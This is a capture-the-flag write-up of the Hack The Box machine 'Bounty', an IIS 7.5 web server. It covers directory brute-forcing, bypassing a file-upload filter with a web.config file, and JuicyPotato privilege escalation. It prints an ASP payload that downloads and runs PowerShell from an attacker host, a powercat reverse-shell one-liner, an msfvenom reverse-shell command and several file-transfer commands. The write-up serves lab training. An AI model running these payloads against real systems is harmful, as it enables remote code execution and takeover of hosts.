# Bounty Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

``nmap -sC -sV -oA bounty 10.10.10.93``

``80/tcp open  http    Microsoft IIS httpd 7.5``

``dirb http://10.10.10.93/ -w /usr/share/wordlists/dirb/common.txt``

``gobuster dir -u http://10.10.10.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -x aspx,asp``

# ${{\color{purple}Initial Foothold}}\ $

### My goubster command allowed me to find the file /transfer.apsx which allows to upload on the server **:white_check_mark:**

``gobuster dir -u http://10.10.10.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -x aspx,asp``

![1](https://user-images.githubusercontent.com/123066149/220401946-fe0162ee-df1e-464c-a47e-e15b6e1fbd5e.PNG)

# ${{\color{purple}Exploitation}}\ $ 

![image](https://user-images.githubusercontent.com/123066149/220402400-1e3f9ba5-fe23-4065-81c3-d6977054fde9.png)

### And the /UploadedFiles directory :

![image](https://user-images.githubusercontent.com/123066149/220402804-2b5b447c-7a21-4f48-85c5-606e5ccc6c37.png)

### I decided to bruteforce a valid extension for this file uploade forms :

![image](https://user-images.githubusercontent.com/123066149/220403441-8a066e40-36cd-4899-93ed-620cf87938ad.png)

![image](https://user-images.githubusercontent.com/123066149/220403611-c9f3b6cd-c12f-4c23-b15e-bc6e34d9c8b8.png)

### Load extension.txt i used hacktrycks to find the right extensions according to the type of server :

https://book.hacktricks.xyz/pentesting-web/file-upload

``ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml``

![image](https://user-images.githubusercontent.com/123066149/220445347-d01adb51-b57f-45f5-b5b2-5ba5dbe30298.png)

### For this attack is important to find the extension that the server will accept. 
### It's with the length of the answer that I find the right extension.

![2](https://user-images.githubusercontent.com/123066149/220445721-12856fa5-e575-4748-a557-29699d739e19.PNG)

### After a little google search there are poc to get to a code execution :

![image](https://user-images.githubusercontent.com/123066149/220451259-7825fcf6-ea3f-4cfa-b8d8-73b249363af7.png)

### I used this code to try a RCE

https://soroush.secproject.com/blog/2019/08/uploading-web-config-for-fun-and-profit-2/

![image](https://user-images.githubusercontent.com/123066149/220451505-f2b8f383-ce2f-4ce5-be05-78bc5fd4bdc9.png)

![image](https://user-images.githubusercontent.com/123066149/220451628-36d207ce-e846-4ae6-8ec3-81c363893f38.png)

### I send the requests via burp 

![3](https://user-images.githubusercontent.com/123066149/220452408-7c694ce9-90d2-4ed8-a37e-c3764b386dc9.PNG)

![4](https://user-images.githubusercontent.com/123066149/220452416-ef897977-6cd4-4e3a-b9c0-8a9224029ef0.PNG)

### The number 15 is there so there is a code execution now I have to change the ASP code :
### I use the code of the web.aspx console and I test the code execution on my computer with the ping command :

``cat web.aspx``

![image](https://user-images.githubusercontent.com/123066149/220453123-12652682-7e90-40c2-a123-6101beb1cf30.png)

![5](https://user-images.githubusercontent.com/123066149/220457118-3740aaee-d196-4c38-8d9d-094bd45befb3.PNG)

![6](https://user-images.githubusercontent.com/123066149/220457157-ef6027ee-106f-447a-8f5b-6e0bead9e242.PNG)

![image](https://user-images.githubusercontent.com/123066149/220456517-e4e8fe26-5504-4111-acd1-d96f20dfbe39.png)

### Now I have to adapt the payload :

``<%``

``Set s = CreateObject("WScript.Shell")``

``Set cmd = s.Exec ("cmd.exe /c powershell.exe -c IEX(New-Object Net.WebClient).downloadString('http://10.10.16.5:80/Invoke-PowerShellTcp.ps1')")``

``o = cmd.StdOut.Readall()``

``Response.write(o)``

``Response.write(1+2)``

``%>``



``Set cmd = s.Exec ("cmd.exe /c powershell.exe -c IEX(New-Object Net.WebClient).downloadString('http://10.10.16.5:80/Invoke-PowerShellTcp.ps1')")``

### OR 

``Set cmd = s.Exec("cmd.exe /c powershell.exe -c IEX(New-Object Net.WebClient).downloadString('http://10.10.16.5:80/Nishangrev.ps1')")``


![image](https://user-images.githubusercontent.com/123066149/220458571-e8616ef9-0daf-4c41-9e7a-8ae8944032b1.png)


![image](https://user-images.githubusercontent.com/123066149/220458631-54bdde53-e959-45c0-90f3-4c6b30c47538.png)


# ${{\color{purple}Privilege Escalation}}\ $

### After a small enumeration it is possible to notice that we have rights :

``SeChangeNotifyPrivilege``

``SeImpersonatePrivilege``

![image](https://user-images.githubusercontent.com/123066149/220458967-5c686876-5ccb-4a0d-b762-ac645dfe55b2.png)


### I decide to redirect the shell to a classical cmd shell because the porwershell shell prevents me from executing binaries 
### For this I use powercat:

``IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.16.5:80/powercat.ps1');powercat -c 10.10.16.5 -p 4444 -e cmd.exe``

![image](https://user-images.githubusercontent.com/123066149/220460046-bbfdde15-e010-4355-8b1d-ea52562a1bca.png)

### I used FTP/WGET/powershell Invoke-WebRequest : but nothing worked for the download of my tools the only solution that works is the SMB share :

-----------FTP------------------
``echo open 10.10.16.5 21> ftp.txt``

``echo USER offsec>> ftp.txt``

``echo lab>> ftp.txt``

``echo bin>> ftp.txt``

``echo GET Juicy_Potato_x86.exe>> ftp.txt``

``echo bye>> ft4.txt``

``ftp -v -n -s:ftp.txt``

-----------PowerShell------------------

``powershell Invoke-WebRequest -Uri http://10.10.16.5:80/nc.exe -OutFile C:\Users\Public\Downloads\nc.exe``

-----------WGET------------------

``wget "http://10.10.16.5:80/nc.exe" -outfile "nc.exe"``

-----------SMBSERVER-IMPACKET------------------

``/usr/bin/impacket-smbserver kali .``

![image](https://user-images.githubusercontent.com/123066149/220461207-fef86ba1-5d0b-431d-86f1-add5683ec68d.png)

``msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.5 LPORT=4321 -f exe -o exploit.exe``

![image](https://user-images.githubusercontent.com/123066149/220463126-0a99d74d-bd0d-4b6b-8fac-d314f06ae337.png)

### I use this command to copy the binaries to the machine :

``copy \\10.10.16.5\kali\exploit.exe``

``copy \\10.10.16.5\kali\JuicyPotato.exe``

![image](https://user-images.githubusercontent.com/123066149/220463530-b6a46bda-37d1-49ca-9a77-450d357525ed.png)

``JuicyPotato.exe -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -t * -p whoami``

``JuicyPotato.exe -l 1337 -c "{659cdea7-489e-11d9-a9cd-000d56965251}" -p c:\Users\merlin\Desktop\exploit.exe  -t *``

![7](https://user-images.githubusercontent.com/123066149/220464952-ac63e66e-e994-4ade-9be4-abfb27857c86.PNG)

![8](https://user-images.githubusercontent.com/123066149/220464961-8763b403-3f63-45e6-bc86-b1b801f9e542.PNG)

# ${{\color{purple}Points of Improvement}}\ $

* Better perform the directory bruteforce
* Redirect bruteforces into files, same as nmap
* Use a wordlist to brute force the extensions of a file upload ( don't waste your time doing it by hand )
* Don't get stuck in a shell that doesn't allow you to run binaries
* Don't hesitate to try several POC to find the right RCE

# ${{\color{purple}Essential commandes}}\ $

``gobuster dir -u http://10.10.10.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -x aspx,asp``

``IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.16.5:80/powercat.ps1');powercat -c 10.10.16.5 -p 4444 -e cmd.exe``

``/usr/bin/impacket-smbserver kali .``

``copy \\10.10.16.5\kali\exploit.exe``

